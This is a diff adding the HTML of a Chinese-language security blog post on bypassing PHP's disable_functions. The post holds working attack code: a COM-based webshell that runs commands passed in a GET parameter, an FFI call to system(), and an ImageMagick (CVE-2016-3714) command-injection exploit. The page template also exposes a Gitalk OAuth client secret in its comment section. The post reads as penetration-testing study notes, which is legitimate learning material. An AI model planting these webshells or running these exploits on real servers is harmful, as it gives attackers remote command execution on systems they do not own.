@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>Bypass_disable_functions - MINX&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
+  <meta name="description" content="PHP中的 disable_functions 用来禁用一些危险的函数来避免被攻击者利用，于是我们要做的就是如何Bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass_disable_functions">
+<meta property="og:url" content="http://iminx.cn/2019/09/10/Bypass-disable-functions/index.html">
+<meta property="og:site_name" content="MINX&#39;s Blog">
+<meta property="og:description" content="PHP中的 disable_functions 用来禁用一些危险的函数来避免被攻击者利用，于是我们要做的就是如何Bypass">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/x.png">
+<meta property="og:updated_time" content="2019-09-10T09:11:03.808Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bypass_disable_functions">
+<meta name="twitter:description" content="PHP中的 disable_functions 用来禁用一些危险的函数来避免被攻击者利用，于是我们要做的就是如何Bypass">
+<meta name="twitter:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/x.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1568106720288">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div class="nexmoe-bg" style="background-image: url(https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/">
+            <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>4</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/clhclh1/clhclh1.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 MINX
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+<script>
+    const getRealPath = (pathname, desc = false) => {
+        if (!pathname) {
+            pathname = window.location.pathname
+        }
+        let names = pathname.split("/")
+        if (desc === false) {
+            for (let i = names.length - 1; i >= 0; --i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        } else {
+            for (let i = 0; i < names.length; ++i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        }
+        return "/"
+    }
+    let links = document.querySelectorAll('.nexmoe-list-item');
+    let rootRealPath = getRealPath(window.location.pathname, true);
+    for (let link of links) {
+        let linkPath = link.getAttribute("href");
+        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
+            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
+        }
+    }
+</script>
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-tab">
+            <a mdui-drawer="{target: '#drawer', swipe: true}">
+              <i class="mdui-icon material-icons">menu</i>
+            </a>
+          </div>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/2.jpg">
+        
+        <h1>Bypass_disable_functions</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月10日</a>
+    <a><i class="nexmoefont icon-areachart"></i>835 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+    
+    
+  </div>
+  <article>
+    <p>PHP中的 disable_functions 用来禁用一些危险的函数来避免被攻击者利用，于是我们要做的就是如何Bypass</p>
+<a id="more"></a>
+<p><a href="https://hackmd.io/s/Hk-8h0VIB" target="_blank" rel="noopener">https://hackmd.io/s/Hk-8h0VIB</a></p>
+<h3 id="Disable-functions"><a href="#Disable-functions" class="headerlink" title="Disable_functions"></a>Disable_functions</h3><p>一般有以下一些函数会被放入disable_functions中：</p>
+<ol>
+<li>exec()</li>
+<li>system()</li>
+<li>chroot()</li>
+<li>chown()</li>
+<li>shell_exec()</li>
+<li>proc_open()</li>
+<li>popen()</li>
+<li>dl()</li>
+<li>passthru()</li>
+<li>……<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3></li>
+</ol>
+<h4 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h4><p>参考：<a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x03-%E5%88%A9%E7%94%A8Windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6COM%E7%BB%95%E8%BF%87" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x03-%E5%88%A9%E7%94%A8Windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6COM%E7%BB%95%E8%BF%87</a><br>上传comshell.php到服务器：</p>
+<pre><code>&lt;?php
+$command = $_GET[&#39;cmd&#39;];
+$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能
+$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput;
+?&gt;</code></pre><p>创建一个COM对象，然后通过调用exec()方法来实现执行系统命令，从而绕过</p>
+<h4 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h4><p>参考：<a href="https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</a><br>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。也就是说，通过PHP调用C的命令执行函数来绕过。<br>下面是一个简单的使用Demo，调用system()函数</p>
+<pre><code>&lt;?php
+$ffi = FFI::cdef(&quot;int system (const char* command);&quot;);
+$ffi-&gt;system(&quot;ls&quot;);
+?&gt;</code></pre><p>FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可</p>
+<h4 id="ImageMagick-漏洞绕过"><a href="#ImageMagick-漏洞绕过" class="headerlink" title="ImageMagick 漏洞绕过"></a>ImageMagick 漏洞绕过</h4><p>参考：<a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a><br>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p>
+<h5 id="主要原理"><a href="#主要原理" class="headerlink" title="主要原理"></a>主要原理</h5><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的！！<br>图片的属性会被%i和%l等占位符被拼接在命令行中，之后被拼接的语句会被system函数执行，而我们只需要使用反引号或者闭合双引号来实现任意命令执行</p>
+<h5 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h5><p>exp：</p>
+<pre><code>&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
+//用参数传递命令
+$command = PHP_SAPI == &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
+if ($command == &#39;&#39;) {
+    $command = &#39;id&#39;;
+}
+//将命令包含入图片内容
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(https://example.com/image.jpg&quot;|$command&quot;)&#39;
+pop graphic-context
+EOF;
+//生成图片
+file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
+//调用模块处理图片来运行命令
+$thumb = new Imagick();
+$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
+$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;KKKK.mvg&quot;);
+unlink(&quot;KKKK.png&quot;);
+?&gt;</code></pre><p><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/x.png" alt="x.png"></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>MINX<br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/09/10/Bypass-disable-functions/" title="http://iminx.cn/2019/09/10/Bypass-disable-functions/" target="_blank" rel="noopener">http://iminx.cn/2019/09/10/Bypass-disable-functions/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1568106720271"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
